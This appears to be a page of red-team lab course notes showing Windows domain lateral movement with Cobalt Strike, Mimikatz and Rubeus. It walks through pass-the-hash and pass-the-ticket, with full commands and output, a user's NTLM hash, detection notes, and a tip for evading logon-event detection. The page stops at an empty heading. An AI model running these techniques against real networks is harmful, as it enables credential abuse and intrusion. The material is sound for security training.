---
description: 09/17/2025
---

# User Impersonation

## Introduction/Motivation

From our initial enumeration and efforts, we know our domain recon that `jking` is a local administrator on multiple computers via his membership of the _**Support Engineers**_ domain group.

We also have credential material for this user in the form of an NTLM hash, AES-256 hash and a Kerberos TGT.

This section demonstrates different techniques in which we can leverage these credentials and use them to access one of the target computers.

There are also several techniques where we don't need credential material directly, but that take advantage of processes that the user is running on a machine we have elevated access on.

{% hint style="info" %}
A common way of testing access to a machine is to list the C drive, as this requires local admin privileges to access.
{% endhint %}

## Pass the Hash

This is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password.

It works by starting a new logon session with a fake identity and then replaces the session information with the domain, username, and NTLM hash provided.

Beacon has a dedicated `pth` command which executes Mimikatz in the background.

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

**First, attempt to list the `C$` share of the `web` machine - this will fail because `bfarmer` is not a local admin there:**

```
beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

**Next, run the `pth` command with `jking`'s username and NTLM hash:**

```
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

user	: jking
domain	: DEV
program	: C:\Windows\system32\cmd.exe /c echo 71fb38e2d65 > \\.\pipe\675b08
impers.	: no
NTLM	: 59fc0f884922b4ce376051134c71e22c
  |  PID  1932
  |  TID  6600
  |  LSA Process is now R/W
  |  LUID 0 ; 7479840 (00000000:00722220)
  \_ msv1_0   - data copy @ 000001F6344B3D20 : OK !
  \_ kerberos - data copy @ 000001F6345BD7C8
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F6344C6128 (32) -> null
```

<mark style="color:yellow;">We can see that the command Mimikatz runs passes the new credentials over a</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`NAMED PIPE`</mark><mark style="color:yellow;">, which Beacon will then impersonate automatically</mark>.

**We can attempt to list the `C$` share again, which will succeed:**

#### "Dropping" Impersonation

We can use the `rev2self` command afterwards to "drop" impersonation:

```
beacon> rev2self
[*] Tasked beacon to revert token

beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

As you can see, we can no longer list the `C$` share since we are no longer impersonating `jking`.

{% hint style="danger" %}
OPSEC Consideration

Two opportunities to detect PTH are the `R/W` Handle to `LSASS`; and looking for the `echo foo > \\.\pipe\bar` pattern in command-line logs.
{% endhint %}

The former is already part of the "_**Suspicious Handle to LSASS**_" saved search.

This time we can see an access mask of `0x1038`. This is a combination of `PROCESS_QUERY_LIMITED_INFORMATION` (`0x1000`), `PROCESS_VM_WRITE` (`0x0020`), `PROCESS_VM_READ` (`0x0010`) and `PROCESS_VM_OPERATION` (`0x0008`).

<figure><img src="../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

The latter can be found via the "_**Suspicious Named Pipe Impersonation**_" search, which queries process events where the arguments contain "`echo`", "`>`" and "`\.\pipe`".

<figure><img src="../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

## Pass the Ticket

This is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create.

Accessing a remote resource will then allow that authentication to happen via Kerberos.

For this, we can leverage the TGT that we extracted from `jking`'s logon session on `Workstation 2`.

The first step is to create a blank, "sacrificial" logon session that we can pass the TGT into.

We do this because a logon session can only hold a single TGT at a time.

If we passed `jking`'s TGT into the LUID for `bfarmer`, it would erase `bfarmer`'s TGT and cause all sorts of authentication issues for the user.

{% hint style="warning" %}
Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges.
{% endhint %}

**`rubeus`' `createnetonly` command will start a new hidden process of our choosing, using the** [**`CreateProcessWithLogonW()`**](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) **API:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : GJB9A2GP
[*] Domain          : VPY1XQRP
[*] Password        : R4ABN1K3
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4748
[+] LUID            : 0x798c2c
```

* As we can see, our new hidden process is `cmd.exe`.

This also creates a new LUID. It will have no tickets inside, so it won't be visible with `triage` just yet.

**The next step is to pass the TGT into this new LUID using the `rubeus`** **`ptt` command. Where the `/luid` is the new LUID we just created and `/ticket` is the base64 encoded ticket we previously extracted:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

[*] Action: Import Ticket
[*] Target LUID: 0x798c2c
[+] Ticket successfully imported!
```

**`rubeus` triage will now show `jking`'s TGT inside this LUID:**

```
 | 0x798c2c | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |
```

Lastly, impersonate the process that we created with `createnetonly` using Cobalt Strike's `steal_token` command.

At a minimum, this requires the PID of the target process, in this example is `4748`.

**We will then be able to access the remote machine:**

```
beacon> steal_token 4748

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```

As before, use the `rev2self` to "drop" the impersonation.

**To destroy the logon session we created, simply kill the process with the `kill` command:**

```
beacon> rev2self
beacon> kill 4748
```

`rubeus` triage will no longer show the logon session.

{% hint style="danger" %}
OPSEC Consideration

By default, `Rubeus` will use a random username, domain and password with `CreateProcessWithLogonW`, which will appear in the associated `4624` logon event.  The "Suspicious Logon Events" saved search will show `4624`'s where the `TargetOutboundDomainName` is not an expected value.
{% endhint %}

<figure><img src="../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password.

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```

## Overpass the Hash
